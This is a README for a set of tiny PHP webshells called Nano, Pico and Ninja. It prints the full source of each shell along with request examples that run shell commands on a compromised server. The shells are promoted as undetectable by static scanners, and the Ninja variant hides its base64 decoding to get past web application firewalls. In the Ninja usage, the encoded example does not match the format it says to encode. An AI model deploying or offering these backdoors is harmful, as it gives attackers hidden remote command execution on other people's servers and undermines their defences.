# nano
Nano is a family of PHP webshells which are code golfed to be extremely stealthy and efficient.\
Put it on watch maybe, I will continue to upload more webshells in here.

**Note:** You may need to tweak some parts of the code if it doesn't work out for your.\
For example, if short tags are disabled, you will need to replace <? with <?php.

### Nano
```php
<?$x=$_GET;@$x[p]=='_'?@$x[f]($x[c]):1;
```
#### Features
- 39 bytes in size
- Can't be detected by static code scanners
- Supports authentication
- No warnings on this fork version!

#### Usage
`http://example.com/nano.php?f=function&c=command&p=password`

`f` is for function\
`c` is for command\
`p` is for password

For example, the code below will execute the `ls` command:

`http://example.com/nano.php?f=system&c=ls&p=password`

### Pico
```php
<?$x=$_GET;@$x[f]($x[c]);
```
#### Features
- 25 bytes in size
- Can't be detected by static code scanners
- No warnings on server logs!

#### Usage
`http://example.com/nano.php?f=function&c=command`

`f` is for function\
`c` is for command

For example, the code below will execute the `ls` command:

`http://example.com/nano.php?f=system&c=ls`

### Ninja
```php
<?$x=explode('~',strrev('edoced_46esab')(getallheaders()['x']));@$x[0]($x[1]);
```
#### Features
- 93 bytes in size
- Fully Undetectable

#### Notes
- The version that calls `base64_decode` directly isnt great because its blacklisted on many wafs\
So i changed that for a reverse call to create the base64 decode call or rot13.\
- The substract string call was removed because it wasnt adding any special obfucation on the base64.

#### Usage
This one a bit complex.\
Lets say you want to run `system(ls)` so write it as `system~ls` and then base64 encode it i.e. `c3lzdGVtKGxzKQ==`\
Now open your terminal and type the following command\
`curl -H 'x: c3lzdGVtKGxzKQ==' http://example.com/backdoored.php`\
~~Too much work? You can use the [handler](https://github.com/UltimateHackers/nano/blob/master/handler.py) instead.~~
The handler needs some redesigning which is not that important right now. 

![handler](https://i.imgur.com/hkAHGwH.png)

#### Everything Else
The nano project is licensed under **MIT license**.
Original Creator : https://github.com/UltimateHackers/nano
